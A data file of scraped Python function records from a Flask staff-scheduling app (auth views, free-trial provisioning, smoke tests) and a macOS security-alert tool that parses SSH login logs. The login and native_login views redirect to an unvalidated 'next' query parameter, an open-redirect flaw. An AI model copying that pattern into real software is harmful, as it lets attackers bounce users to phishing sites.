{"docstring": "\"\"\"View and modify the phone number\"\"\"\n", "func_signal": "def phone_number_remove():\n", "code": "if not current_user.phone_number and not current_user.get_phone_data_pending_verification(\n):\n    # Not this step - send to router\n    return redirect(url_for(\"auth.phone_number_router\"))\n\nform = RemovePhoneNumberForm()\nif form.validate_on_submit():\n    current_user.remove_phone_number()\n    flash(\"Your phone number has been removed\", \"success\")\n    return redirect(url_for(\"auth.portal\"))\nreturn render_template(\n    \"auth.html\",\n    form_title=\"Remove Your Phone Number\",\n    help_text=\"Removing your phone number will stop all SMS communication from Staffjoy. If you wish to modify which notifications you receive, please <a href=\\\"%s\\\">modify your notifications</a>.\"\n    % url_for(\"auth.notifications\"),\n    panel_body_class=\"dangerous-buttons\",\n    form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"Add a new phone number\"\"\"\n# Make sure this is correct page\n", "func_signal": "def phone_number_add():\n", "code": "if current_user.phone_number or current_user.get_phone_data_pending_verification(\n):\n    # Not this step - send to router\n    return redirect(url_for(\"auth.phone_number_router\"))\n\n# Populate form choices\nchoices = []\nfor country_code in current_app.config[\"TWILIO_NUMBER\"].keys():\n    country_name = PHONE_COUNTRY_CODE_TO_COUNTRY.get(country_code)\n    description = \"+%s\" % country_code\n    if country_name:\n        description += \" (%s)\" % country_name\n    # tuple of (key, description)\n    choices.append((country_code, description))\n\nform = NewPhoneNumberForm(country_code_choices=choices)\n\nif form.validate_on_submit():\n    try:\n        current_user.set_phone_number(form.phone_country_code.data,\n                                      form.phone_national_number.data)\n        success = True\n    except Exception as e:\n        # Don't tell user why due to security reasons\n        success = False\n        current_app.logger.info(\n            \"User %s (%s) entered phone number invalid due to %s\" %\n            (current_user.id, current_user.email, e))\n\n    if success:\n        flash(\"A confirmation pin has been sent via SMS to you\", \"success\")\n        return redirect(url_for(\"auth.phone_number_verify\"))\n\n    # Otherwise - invalid?\n    flash(\"We were unable to validate this phone number\", \"danger\")\n\nreturn render_template(\n    \"auth.html\",\n    form_title=\"Add Your Phone Number\",\n    help_text=\"Add your phone number to Staffjoy for SMS reminders and improved account security. If your country is unavailable, please contact support.\",\n    form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"Add a new phone number\"\"\"\n", "func_signal": "def phone_number_verify():\n", "code": "if current_user.phone_number or not current_user.get_phone_data_pending_verification(\n):\n    # Not this step - send to router\n    return redirect(url_for(\"auth.phone_number_router\"))\n\nform = VerifyPhoneNumberForm()\nif form.validate_on_submit():\n    success = current_user.verify_phone_number(form.pin.data)\n    if success:\n        flash(\"Your phone number has been confirmed\", \"success\")\n        return redirect(url_for(\"auth.portal\"))\n\n    flash(\"This pin is invalid\", \"danger\")\n\nreturn render_template(\n    \"auth.html\",\n    form_title=\"Confirm Your Phone Number\",\n    help_text=\"Please enter the verification pin that we sent via SMS to your phone number. If you are unable to verify your number, please <a href=\\\"%s\\\">remove it</a> and start again.\"\n    % url_for(\"auth.phone_number_remove\"),\n    form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "# Make the user account\n\n", "func_signal": "def provision(form):\n", "code": "user = User(\n    email=form.email.data.lower().strip(),\n    password=form.password.data,\n    name=form.name.data.strip(),\n    active=False,\n    confirmed=False, )\n\ntry:\n    db.session.add(user)\n    db.session.commit()\nexcept:\n    db.session.rollback()\n    raise Exception(\"Dirty session\")\nuser.flush_associated_shift_caches()\n\n# Send activation email\ntoken = user.generate_confirmation_token(trial=True)\nuser.send_email(\"[Action Required] Activate Your Free Trial\",\n                render_template(\n                    \"email/confirm-trial.html\", user=user, token=token),\n                True)\n\n# Create an org\norganization = Organization(\n    name=form.company_name.data,\n    day_week_starts=form.day_week_starts.data.lower(),\n    enterprise_access=form.enterprise_access.data == \"yes\",\n    plan=form.plan.data,\n    trial_days=current_app.config.get(\"FREE_TRIAL_DAYS\"),\n    active=True, )\ndb.session.add(organization)\ndb.session.commit()\n\norganization.admins.append(user)\ndb.session.commit()\n\n# get timezone\ntimezone_name = form.timezone.data.strip()\n\nif timezone_name not in pytz.all_timezones:\n    timezone_name = current_app.config.get(\"DEFAULT_TIMEZONE\")\n\ntimezone = pytz.timezone(timezone_name)\ndefault_tz = pytz.timezone(current_app.config.get(\"DEFAULT_TIMEZONE\"))\n\n# Add a location\nl = Location(\n    name=\"Demo - Cafe\",\n    organization_id=organization.id,\n    timezone=timezone_name)\ndb.session.add(l)\ndb.session.commit()\n\n# Add two roles\nr_barista = Role(name=\"Baristas\", location_id=l.id)\nr_cashier = Role(name=\"Cashiers\", location_id=l.id)\ndb.session.add(r_barista)\ndb.session.add(r_cashier)\ndb.session.commit()\n\nbarista_user_ids = []\nfor email in BARISTAS:\n    barista = User.query.filter_by(email=email.lower()).first()\n    if barista is None:\n        barista = User.create_and_invite(\n            email,\n            name=\"Demo User\",\n            silent=True,  # Silence on dev\n        )\n    barista_user_ids.append(barista.id)\n    db.session.add(RoleToUser(user_id=barista.id, role_id=r_barista.id))\n    db.session.commit()\n\n# Add the current user as a barista too\ndb.session.add(RoleToUser(user_id=user.id, role_id=r_barista.id))\ndb.session.commit()\n\ncashier_user_ids = []\nfor email in CASHIERS:\n    cashier = User.query.filter_by(email=email.lower()).first()\n    if cashier is None:\n        cashier = User.create_and_invite(\n            email,\n            name=\"Demo User\",\n            silent=True,  # Silence on dev\n        )\n\n    cashier_user_ids.append(cashier.id)\n\n    # cashiers are full time, so they inherit max_hours_per_week at 40 instead of 29\n    db.session.add(\n        RoleToUser(\n            user_id=cashier.id,\n            role_id=r_cashier.id,\n            max_half_hours_per_workweek=80))\n    db.session.commit()\n\n# Load schedule data\nbarista_demand = json.loads(\n    '{\"monday\":[0,0,0,0,0,0,0,0,2,2,3,4,4,4,3,2,1,1,0,0,0,0,0,0],\"tuesday\":[0,0,0,0,0,0,0,0,2,3,4,4,4,4,3,2,1,1,0,0,0,0,0,0],\"wednesday\":[0,0,0,0,0,0,0,0,2,3,4,4,4,4,3,2,2,1,0,0,0,0,0,0],\"thursday\":[0,0,0,0,0,0,0,0,2,3,4,4,4,4,3,2,2,1,0,0,0,0,0,0],\"friday\":[0,0,0,0,0,0,0,0,2,2,3,4,4,4,3,2,1,1,0,0,0,0,0,0],\"saturday\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"sunday\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}'\n)\ncashier_demand = json.loads(\n    '{\"monday\":[0,0,0,0,0,0,0,0,1,1,1,2,2,2,2,1,1,1,0,0,0,0,0,0],\"tuesday\":[0,0,0,0,0,0,0,0,1,1,1,2,2,2,2,1,1,1,0,0,0,0,0,0],\"wednesday\":[0,0,0,0,0,0,0,0,1,1,2,2,2,2,2,2,1,1,0,0,0,0,0,0],\"thursday\":[0,0,0,0,0,0,0,0,1,1,2,2,2,2,2,2,1,1,0,0,0,0,0,0],\"friday\":[0,0,0,0,0,0,0,0,1,1,1,2,2,2,1,1,1,1,0,0,0,0,0,0],\"saturday\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"sunday\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}'\n)\n\n# Have 4 schedules\ndone_schedule_start_local = timezone.localize(\n    normalize_to_midnight(datetime.utcnow() + timedelta(days=1)))\ndone_schedule_start = done_schedule_start_local.astimezone(default_tz)\n\n# Increment until we get the correct starting day of week\n# (be cautious here due to infinite loop possibility)\nttl = 7  # Prevent infinite loops\nwhile (done_schedule_start_local.strftime(\"%A\").lower() !=\n       organization.day_week_starts.lower() and ttl > 0):\n\n    done_schedule_start_local = normalize_to_midnight(\n        (done_schedule_start + timedelta(days=1, hours=1)\n         ).astimezone(timezone))\n    done_schedule_start = done_schedule_start_local.astimezone(default_tz)\n    ttl -= 1\n\nif ttl == 0:\n    raise Exception(\"Unable to match day of week\")\n\ndone_schedule_start = done_schedule_start_local.astimezone(default_tz)\ndone_schedule_stop = normalize_to_midnight(\n    (done_schedule_start + timedelta(days=7, hours=1)\n     ).astimezone(timezone)).astimezone(default_tz)\ncurrent_schedule_start = normalize_to_midnight(\n    (done_schedule_start - timedelta(days=6, hours=23)\n     ).astimezone(timezone)).astimezone(default_tz)\npast_schedule_start = normalize_to_midnight(\n    (done_schedule_start - timedelta(days=13, hours=23)\n     ).astimezone(timezone)).astimezone(default_tz)\n\n# Make the schedules\n\n# the previous week\nbarista_schedule_past = Schedule2.create(\n    role_id=r_barista.id,\n    start=past_schedule_start,\n    stop=current_schedule_start,\n    state=\"published\",\n    demand=barista_demand)\ncashier_schedule_past = Schedule2.create(\n    role_id=r_cashier.id,\n    start=past_schedule_start,\n    stop=current_schedule_start,\n    state=\"published\",\n    demand=cashier_demand)\n\n# the current week\nbarista_schedule_current = Schedule2.create(\n    role_id=r_barista.id,\n    start=current_schedule_start,\n    stop=done_schedule_start,\n    state=\"published\",\n    demand=barista_demand)\ncashier_schedule_current = Schedule2.create(\n    role_id=r_cashier.id,\n    start=current_schedule_start,\n    stop=done_schedule_start,\n    state=\"published\",\n    demand=cashier_demand)\n\n# next week (schedule is published)\nbarista_schedule_done = Schedule2.create(\n    role_id=r_barista.id,\n    start=done_schedule_start,\n    stop=done_schedule_stop,\n    state=\"published\",\n    demand=barista_demand)\ncashier_schedule_done = Schedule2.create(\n    role_id=r_cashier.id,\n    start=done_schedule_start,\n    stop=done_schedule_stop,\n    state=\"published\",\n    demand=cashier_demand)\n\nday_mapping = make_day_mapping_dict(organization.day_week_starts)\n\n# along with each shift, create a timeclock record if the date is before this cutoff\ntimeclock_cutoff = normalize_to_midnight(datetime.utcnow())\n\n# add barista shifts\nfor i, set_of_shifts in enumerate(BARISTA_SHIFTS):\n    for schedule in [\n            barista_schedule_past, barista_schedule_current,\n            barista_schedule_done\n    ]:\n\n        for shift_tuple in set_of_shifts:\n            current_date = schedule.start + timedelta(\n                days=day_mapping[shift_tuple[0]])\n            shift_start = current_date + timedelta(hours=shift_tuple[1])\n            shift_stop = shift_start + timedelta(hours=shift_tuple[2])\n\n            s = Shift2(\n                role_id=schedule.role_id,\n                user_id=barista_user_ids[i],\n                start=shift_start,\n                stop=shift_stop,\n                published=True)\n\n            db.session.add(s)\n            db.session.commit()\n\n            # create a timeclock if appropriate\n            if current_date < timeclock_cutoff:\n\n                # this will make 7% of the timeclocks needed be empty\n                if random.randint(1, 14) == 14:\n                    continue\n\n                start_minutes = random.randrange(-3, 8)\n                start_seconds = random.randrange(-30, 31)\n\n                stop_minutes = random.randrange(-3, 15)\n                stop_seconds = random.randrange(-30, 31)\n\n                start = shift_start + timedelta(\n                    minutes=start_minutes, seconds=start_seconds)\n                stop = shift_stop + timedelta(\n                    minutes=stop_minutes, seconds=stop_seconds)\n\n                t = Timeclock(\n                    role_id=schedule.role_id,\n                    user_id=barista_user_ids[i],\n                    start=start,\n                    stop=stop)\n\n                db.session.add(t)\n                db.session.commit()\n\n# add cashier shifts\nfor i, set_of_shifts in enumerate(CASHIER_SHIFTS):\n    for schedule in [\n            cashier_schedule_past, cashier_schedule_current,\n            cashier_schedule_done\n    ]:\n\n        for shift_tuple in set_of_shifts:\n            current_date = schedule.start + timedelta(\n                days=day_mapping[shift_tuple[0]])\n            shift_start = current_date + timedelta(hours=shift_tuple[1])\n            shift_stop = shift_start + timedelta(hours=shift_tuple[2])\n\n            s = Shift2(\n                role_id=schedule.role_id,\n                user_id=cashier_user_ids[i],\n                start=shift_start,\n                stop=shift_stop,\n                published=True)\n\n            db.session.add(s)\n            db.session.commit()\n\n            # create a timeclock if appropriate\n            if current_date < timeclock_cutoff:\n\n                # this will make 7% of the timeclocks needed be empty\n                if random.randint(1, 14) == 14:\n                    continue\n\n                start_minutes = random.randrange(-3, 8)\n                start_seconds = random.randrange(-30, 31)\n\n                stop_minutes = random.randrange(-3, 15)\n                stop_seconds = random.randrange(-30, 31)\n\n                start = shift_start + timedelta(\n                    minutes=start_minutes, seconds=start_seconds)\n                stop = shift_stop + timedelta(\n                    minutes=stop_minutes, seconds=stop_seconds)\n\n                t = Timeclock(\n                    role_id=schedule.role_id,\n                    user_id=cashier_user_ids[i],\n                    start=start,\n                    stop=stop)\n\n                db.session.add(t)\n                db.session.commit()\n\n# add shifts for our dear user\nfor schedule in [\n        barista_schedule_past, barista_schedule_current,\n        barista_schedule_done\n]:\n\n    for shift_tuple in USER_BARISTA_SHIFTS:\n\n        current_date = schedule.start + timedelta(\n            days=day_mapping[shift_tuple[0]])\n        shift_start = current_date + timedelta(hours=shift_tuple[1])\n        shift_stop = shift_start + timedelta(hours=shift_tuple[2])\n\n        s = Shift2(\n            role_id=schedule.role_id,\n            user_id=user.id,\n            start=shift_start,\n            stop=shift_stop,\n            published=True)\n\n        db.session.add(s)\n        db.session.commit()\n\n        # create a timeclock if appropriate\n        if current_date < timeclock_cutoff:\n\n            start_minutes = random.randrange(-3, 8)\n            start_seconds = random.randrange(-30, 31)\n\n            stop_minutes = random.randrange(-3, 15)\n            stop_seconds = random.randrange(-30, 31)\n\n            start = shift_start + timedelta(\n                minutes=start_minutes, seconds=start_seconds)\n            stop = shift_stop + timedelta(\n                minutes=stop_minutes, seconds=stop_seconds)\n\n            t = Timeclock(\n                role_id=schedule.role_id,\n                user_id=user.id,\n                start=start,\n                stop=stop)\n\n            db.session.add(t)\n            db.session.commit()\n\n# add unassigned shifts to barista\nfor shift_tuple in UNASSIGNED_BARISTA_SHIFTS:\n    shift_start = barista_schedule_done.start + timedelta(\n        days=day_mapping[shift_tuple[0]], hours=shift_tuple[1])\n    shift_stop = shift_start + timedelta(hours=shift_tuple[2])\n    s = Shift2(\n        role_id=barista_schedule_done.role_id,\n        start=shift_start,\n        stop=shift_stop,\n        published=True)\n\n    db.session.add(s)\n    db.session.commit()\n\ncurrent_app.logger.info(\n    \"Created a free trial for user %s (id %s) - org %s (id %s)\" %\n    (user.email, user.id, organization.name, organization.id))\nreturn", "path": "app\\auth\\free_trial.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "# (if you are copying and pasting, update class title below)\n", "func_signal": "def setUp(self):\n", "code": "super(BaseScheduleShift, self).setUp()\n\nschedules = self.role.get_schedules(\n    start=self.range_start, end=self.range_stop)\nself.schedule = schedules.pop()\nself.schedule.patch(state=\"unpublished\")\n\n# add a worker to the role\nanother_worker = self.role.create_worker(\n    email=\"demo+anotherdude@7bridg.es\",\n    min_hours_per_workweek=30,\n    max_hours_per_workweek=40)\n\nschedule_start = iso8601.parse_date(\n    self.schedule.data.get(\"start\")).replace(tzinfo=None)\n\n# create some shifts\n# shift data\nstart1 = schedule_start + timedelta(hours=8)\nstop1 = start1 + timedelta(hours=5, minutes=30)\n\nstart2 = schedule_start + timedelta(days=2, hours=4)\nstop2 = start2 + timedelta(hours=7)\n\nstart3 = schedule_start + timedelta(days=4, hours=9)\nstop3 = start3 + timedelta(hours=6)\n\nself.role.create_shift(\n    start=start1.isoformat(), stop=stop1.isoformat())\nself.role.create_shift(\n    start=start2.isoformat(), stop=stop2.isoformat())\nself.role.create_shift(\n    start=start3.isoformat(),\n    stop=stop3.isoformat(),\n    user_id=another_worker.get_id())\n\nself.schedule.patch(state=\"published\")", "path": "tests\\smoke\\organizations\\locations\\roles\\schedules\\shifts\\base_schedule_shift.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\" View and manage all api keys\"\"\"\n", "func_signal": "def api_keys():\n", "code": "keys = ApiKey.query.filter_by(\n    user_id=current_user.id).order_by(desc(ApiKey.last_used)).all()\nreturn render_template(\n    \"api_keys.html\",\n    api_keys=keys,\n    api_token=current_user.generate_api_token())", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"\ngiven a day_week_start, creates a dictionary mapping each day of the week\nto 1-indexed positions\n\ne.g. day_week_start = 'tuesday' -> result[\"wednesday\"] = 2\n\"\"\"\n\n", "func_signal": "def make_day_mapping_dict(day_week_start):\n", "code": "day_week_start = day_week_start.lower()\n\nif day_week_start not in DAYS_IN_WEEK:\n    raise Exception(\"invalid day supplied to day mapping:\\t%s\" %\n                    day_week_start)\n\nresult = {}\nweek_length = 7\nstart_index = DAYS_IN_WEEK.index(day_week_start)\n\nfor i, day in enumerate(DAYS_IN_WEEK):\n    result[day] = (i + week_length - start_index) % week_length\n\nreturn result", "path": "app\\auth\\free_trial.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"login page for the Staffjoy application on native\"\"\"\n", "func_signal": "def native_login():\n", "code": "REMEMBER_ME = True  # Always remember native users\nif current_user.is_authenticated:\n    return redirect(url_for(\"main.index\"))\n\nform = NativeLoginForm()\nif form.validate_on_submit():\n    user = User.query.filter_by(\n        email=form.email.data.lower().strip()).first()\n    if user is None:\n        # Otherwise - see if they entered a username. Not labeled, but support it.\n        user = User.query.filter_by(\n            username=form.email.data.lower().strip()).first()\n\n    if user is not None and user.active and user.verify_password(\n            form.password.data.strip()):\n        login_user(user, REMEMBER_ME)\n        user.track_event(\"native_login\")\n        current_app.logger.info(\"Native login %s (id %s)\" %\n                                (user.email, user.id))\n\n        # Intelligently try to put users in the correct app upon login\n        if request.args.get(\"next\"):\n            # User is following a link to the correct destination\n            return redirect(request.args.get(\"next\"))\n        return redirect(url_for(\"main.index\"))  # This will smart route\n\n    flash(\"Invalid email or password\", \"danger\")\n\n# Set a native cookie\nresp = make_response(render_template(\"nativelogin.html\", form=form))\nresp.set_cookie(\n    current_app.config.get(\"NATIVE_COOKIE_NAME\"),\n    \"1\",\n    expires=(datetime.utcnow() + timedelta(\n        days=current_app.config.get(\"NATIVE_COOKIE_LIFE_DAYS\"))))\nreturn resp", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\" View and manage all sessions\"\"\"\n", "func_signal": "def sessions():\n", "code": "form = SessionsForm()\nif form.validate_on_submit():\n    current_user.logout_all_sessions()\n    flash(\"All active sessions have been deleted.\", \"success\")\n    return redirect(url_for(\"auth.login\"))\n\nreturn render_template(\n    \"sessions.html\",\n    form=form,\n    api_token=current_user.generate_api_token())", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "# (if you are copying and pasting, update class title below)\n", "func_signal": "def setUp(self):\n", "code": "super(BaseShiftUser, self).setUp()\n\n# using self.unassigned_shift from BaseShift, the test will\n# make a few more workers in the role, and then fetch them\n# from the unassigned shift\n\n# self.worker exists from base_test.py\n# self.coworker exists from base_shift.py\n\n# add 3 more workers, total will now be 5\n\n# worker1\nself.role.create_worker(\n    email=\"demo+coolworker@7bridg.es\",\n    min_hours_per_workweek=30,\n    max_hours_per_workweek=40)\n\n# worker2\nself.role.create_worker(\n    email=\"demo+specialworker@7bridg.es\",\n    min_hours_per_workweek=30,\n    max_hours_per_workweek=40)\n\n# worker3\nself.role.create_worker(\n    email=\"demo+amazingworker@7bridg.es\",\n    min_hours_per_workweek=30,\n    max_hours_per_workweek=40)\n\n# create another shift with same time as unassigned shift\n# and assign to coworker\nself.role.create_shift(\n    start=self.unassigned_shift.data.get(\"start\"),\n    stop=self.unassigned_shift.data.get(\"stop\"),\n    user_id=self.coworker.get_id())\n\n# there are 4 eligible workers for the unassigned shift", "path": "tests\\smoke\\organizations\\locations\\roles\\shifts\\users\\base_shift_user.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"View and modify the phone number\"\"\"\n", "func_signal": "def phone_number_router():\n", "code": "if not current_user.phone_number:\n    if current_user.get_phone_data_pending_verification():\n        return redirect(url_for(\"auth.phone_number_verify\"))\n    else:\n        return redirect(url_for(\"auth.phone_number_add\"))\nreturn redirect(url_for(\"auth.phone_number_remove\"))", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\" Request a password reset \"\"\"\n", "func_signal": "def password_reset_request():\n", "code": "if not current_user.is_anonymous:\n    return redirect(url_for(\"auth.portal\"))\nform = RequestPasswordResetForm()\n\nif form.validate_on_submit():\n    user = User.query.filter_by(\n        email=form.email.data.lower().strip()).first()\n    if user:\n        # Check if account is active\n        if not user.active:\n            # Need to activate account\n            User.send_activation_email(user)\n        else:\n            token = user.generate_reset_token()\n            user.send_email(\"Reset Your Password\",\n                            render_template(\n                                \"email/reset-password.html\",\n                                user=user,\n                                token=token), True)\n    # Never let the user know whether the account exists\n    flash(\"An email with instructions on resetting your password has been \"\n          \"sent to you\", \"success\")\n    return redirect(url_for(\"auth.login\"))\n\nreturn render_template(\n    \"auth.html\", form_title=\"Reset Your Password\", form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\" Finish creating an account after activation \"\"\"\n# No logged-in users\n", "func_signal": "def activate_account(token):\n", "code": "if not current_user.is_anonymous:\n    return redirect(url_for(\"auth.portal\"))\n\n# Identify the user\nuser_id = User.get_id_from_activate_token(token)\n\n# Not found?\nif user_id is False:\n    flash(\n        \"Your activation link has expired. Please use the password reset link to get a new link.\"\n    )\n    return redirect(url_for(\"auth.password_reset_request\"))\n\n# Pull up user\nuser = User.query.get_or_404(user_id)\nif user.active:\n    flash(\"Your account has already been activated\", \"success\")\n    return redirect(url_for(\"auth.login\"))\n\nform = ActivateForm()\nif form.validate_on_submit():\n    if user.activate_account(token, form.name.data, form.password.data,\n                             form.username.data):\n        login_user(user)\n        flash(\"Your account has been activated\", \"success\")\n\n        # Check if planner access, and if so redirect to onboarding videos\n        adminships = user.admin_of.all()\n        memberships = user.memberships()\n        if len(memberships) > 0 and len(adminships) == 0:\n            m = memberships[0]\n            # Onboarding video! Which one?\n            if Organization.query.get(\n                    m.get(\"organization_id\")).plan == \"flex-v1\":\n                return redirect(url_for(\"main.contractor_onboarding\"))\n            else:\n                return redirect(url_for(\"main.employee_onboarding\"))\n\n        # Generic router\n        return redirect(url_for(\"main.index\"))\n\n    else:\n        flash(\n            \"We were unable to activate your account. Please contact support.\",\n            \"danger\")\n        return redirect(url_for(\"main.index\"))\n\n# Otherwise show activation form\nform.name.data = user.name\nform.username.data = user.username  # in case it gets set elsewehre\nreturn render_template(\n    \"auth.html\", form_title=\"Activate Your Account\", form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"Remove the native cookie. Used for testing.\"\"\"\n", "func_signal": "def destroy_native():\n", "code": "resp = make_response(redirect(url_for(\"auth.login\")))\nresp.set_cookie(\n    current_app.config.get(\"NATIVE_COOKIE_NAME\"), \"\", expires=0)\nreturn resp", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"sign up for the Staffjoy application\"\"\"\n", "func_signal": "def sign_up():\n", "code": "if is_native():\n    return redirect(url_for(\"auth.native_login\"))\n\nif not current_app.config.get(\"ALLOW_COMPANY_SIGNUPS\"):\n    return redirect(url_for(\"main.index\"))\n\nform = SignUpForm()\nif form.validate_on_submit():\n    user = User(\n        email=form.email.data.lower().strip(),\n        username=form.username.data.lower().strip(),\n        password=form.password.data,\n        name=form.name.data.strip())\n\n    try:\n        db.session.add(user)\n        db.session.commit()\n    except:\n        db.session.rollback()\n        raise Exception(\"Dirty session\")\n\n    user.flush_associated_shift_caches()\n    token = user.generate_confirmation_token()\n    user.send_email(\"Confirm Your Account\",\n                    render_template(\n                        \"email/confirm-account.html\",\n                        user=user,\n                        token=token), True)\n\n    flash(\"A confirmation email has been sent to you by email.\", \"success\")\n    return redirect(url_for(\"auth.login\"))\nreturn render_template(\"auth.html\", form_title=\"Sign Up\", form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"sign up for the Staffjoy application and a free trial\"\"\"\n", "func_signal": "def free_trial():\n", "code": "if current_user.is_authenticated:\n    return redirect(url_for(\"auth.portal\"))\n\nform = FreeTrialForm()\nif form.validate_on_submit():\n    provision(form)\n    # TODO - have a dedicated sign up confirmation page\n    # \"What Happens Next\"\n    return render_template(\"confirm_free_trial.html\", form=form)\n\n# Check if the plan was passed\nplan = request.args.get(\"plan\")\nif plan is not None and plan in plans.keys() and plans[plan][\"active\"]:\n    form.plan.data = plan\n\nform.plan.enterprise_access = request.args.get(\"enterprise_access\")\n\nreturn render_template(\n    \"sign_up.html\", form_title=\"Begin Your Trial\", form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"Modify the notifications that Staffjoy sends\"\"\"\n\n", "func_signal": "def notifications():\n", "code": "form = ChangeNotificationsForm()\nif form.validate_on_submit():\n    for attr in NOTIFICATION_ATTRS:\n        setattr(current_user, attr, getattr(form, attr).data)\n\n    flash(\"Your notification preferences have been updated\", \"success\")\n    return redirect(url_for(\"auth.portal\"))\n\nfor attr in NOTIFICATION_ATTRS:\n    form_obj = getattr(form, attr)\n    form_obj.data = getattr(current_user, attr)\nreturn render_template(\n    \"auth.html\", form_title=\"Your Account Notifications\", form=form)", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"login page for the Staffjoy application\"\"\"\n", "func_signal": "def login():\n", "code": "if is_native():\n    return redirect(url_for(\"auth.native_login\", **request.args))\n\nif current_user.is_authenticated:\n    return redirect(url_for(\"auth.portal\"))\n\nform = LoginForm()\nif form.validate_on_submit():\n    user = User.query.filter_by(\n        email=form.email.data.lower().strip()).first()\n    if user is None:\n        # Otherwise - see if they entered a username. Not labeled, but support it.\n        user = User.query.filter_by(\n            username=form.email.data.lower().strip()).first()\n\n    if user is not None and user.active and user.verify_password(\n            form.password.data.strip()):\n        login_user(user, form.remember_me.data)\n\n        # Intelligently try to put users in the correct app upon login\n        if request.args.get(\"next\"):\n            # User is following a link to the correct destination\n            return redirect(request.args.get(\"next\"))\n        return redirect(url_for(\"main.index\"))  # This will smart route\n\n    flash(\"Invalid email or password\", \"danger\")\n\n# Disable native cookie\nreturn make_response(render_template(\"login.html\", form=form))", "path": "app\\auth\\views.py", "repo_name": "Staffjoy/suite", "stars": 834, "license": "other", "language": "python", "size": 18100}
{"docstring": "\"\"\"generator which yields new lines from a logfile, or None\"\"\"\n", "func_signal": "def gen_lines(path):\n", "code": "with open(path, 'r') as logfile:\n    logfile.seek(0, 2)  # jump to end\n    yield 'ready'       # otherwise it will hang until the first change appears\n    while True:\n        yield logfile.readline().strip() or None", "path": "Security Growler Light.app\\Contents\\Resources\\sources\\logfile.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"infinite runloop which reads lines out of their source generators\"\"\"\n\n", "func_signal": "def get_new_lines(source_generators=all_source_generators, delay=POLLING_SPEED):\n", "code": "while True:\n    for source, generator in source_generators.iteritems():\n        next_line = next(generator)\n        while next_line:\n            yield (source, next_line)\n            next_line = next(generator)\n    sleep(delay)", "path": "Security Growler Light.app\\Contents\\Resources\\sources\\__init__.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"parse SSHD event log lines into pass and fail alerts messages\"\"\"\n", "func_signal": "def parse(line, source=None):\n", "code": "title, body = '', ''\n\nif KEYAUTH_EVENT_FILTER.findall(line) or PASSWORD_EVENT_FILTER.findall(line):\n    user, src = parse_line(line)\n    title = 'SSH LOGIN SUCCESS: %s' % user\n    method = 'Password' if ' keyboard' in line else 'Public Key'\n    body = 'from: %s using a %s' % (src, method)\n\n\nelif FAIL_EVENT_FILTER.findall(line):\n    user, src = parse_line(line)\n    summary = parse_summary(line)\n    title = 'SSH EVENT: %s' % user or (summary[:15] + '...')\n    body = 'from: %s | %s' % (src, summary)\n\nreturn ('alert' if title else None, title, body)", "path": "parsers\\ssh.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"parse SSHD event log lines into pass and fail alerts messages\"\"\"\n", "func_signal": "def parse(line, source=None):\n", "code": "title, body = '', ''\n\nif KEYAUTH_EVENT_FILTER.findall(line) or PASSWORD_EVENT_FILTER.findall(line):\n    user, src = parse_line(line)\n    title = 'SSH LOGIN SUCCESS: %s' % user\n    method = 'Password' if ' keyboard' in line else 'Public Key'\n    body = 'from: %s using a %s' % (src, method)\n\n\nelif FAIL_EVENT_FILTER.findall(line):\n    user, src = parse_line(line)\n    summary = parse_summary(line)\n    title = 'SSH EVENT: %s' % user or (summary[:15] + '...')\n    body = 'from: %s | %s' % (src, summary)\n\nreturn ('alert' if title else None, title, body)", "path": "Security Growler.app\\Contents\\Resources\\parsers\\ssh.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
